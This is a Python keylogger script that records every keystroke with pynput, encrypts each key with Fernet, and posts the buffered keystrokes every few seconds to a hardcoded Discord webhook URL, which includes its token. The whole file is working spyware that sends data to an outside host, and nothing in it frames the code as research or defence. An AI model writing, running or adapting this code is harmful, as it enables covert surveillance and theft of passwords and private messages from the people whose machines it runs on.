from cryptography.fernet import Fernet
from pynput import keyboard
import requests
import os
import threading
import time

# Generate or load the encryption key
key_file = "encryption_key.key"

if os.path.exists(key_file):
    # If the key file exists, read the key from it
    with open(key_file, "rb") as f:
        key = f.read()
    cipher = Fernet(key)
else:
    # If the key file does not exist, generate a new key and save it to the file
    key = Fernet.generate_key()
    with open(key_file, "wb") as f:
        f.write(key)
    print("Encryption key generated and saved as 'encryption_key.key'")
    cipher = Fernet(key)

# Discord Webhook URL
discord_webhook_url = "https://discord.com/api/webhooks/1311116235433574492/frXUQT2FN8NbTvzA5TCiZ2Moc_QLS56xT49_SaxZbwS-XfmDv815jOGYC3ozovFsuZsX"

# File to store logged keystrokes temporarily
log_file = "key_log.txt"

# Buffer to collect keystrokes
keystroke_buffer = []
BUFFER_SIZE = 50  # Send message when 50 keystrokes are collected
TIME_INTERVAL = 10  # Send message every 10 seconds, even if buffer is not full


def send_to_discord():
    """Send the buffered keystrokes to Discord as a whole."""
    last_sent_time = time.time()

    while True:
        try:
            current_time = time.time()
            if len(keystroke_buffer) >= BUFFER_SIZE or (current_time - last_sent_time) >= TIME_INTERVAL:
                # Prepare the message content
                message_content = "".join(keystroke_buffer)

                # Truncate to Discord's max message size if needed
                if len(message_content) > 2000:
                    message_content = message_content[:1997] + "..."
                elif len(message_content) < 20000:
                    message_content = message_content[:1997] + "..."

                # Send to Discord
                payload = {"content": f"**Keystrokes Logged:**\n```\n{message_content}\n```"}
                response = requests.post(discord_webhook_url, json=payload)

                if response.status_code == 204:
                    # Clear the buffer after sending
                    keystroke_buffer.clear()
                    last_sent_time = current_time
                else:
                    print(f"Failed to send to Discord: {response.status_code}, {response.text}")

        except Exception as e:
            print(f"Error sending to Discord: {e}")
        time.sleep(1)


def on_press(key):
    """Log each keystroke and add it to the buffer."""
    try:
        if hasattr(key, 'char') and key.char is not None:
            keystroke = cipher.encrypt(key.char.encode())
        else:
            keystroke = cipher.encrypt(f"[{key}]".encode())

        keystroke_buffer.append(keystroke.decode(errors="ignore"))
    except Exception as e:
        print(f"Error logging key press: {e}")


def main():
    """Main function to start the keylogger and sending thread."""
    # Start the Discord-sending thread
    threading.Thread(target=send_to_discord, daemon=True).start()

    # Start listening to keystrokes
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    main()
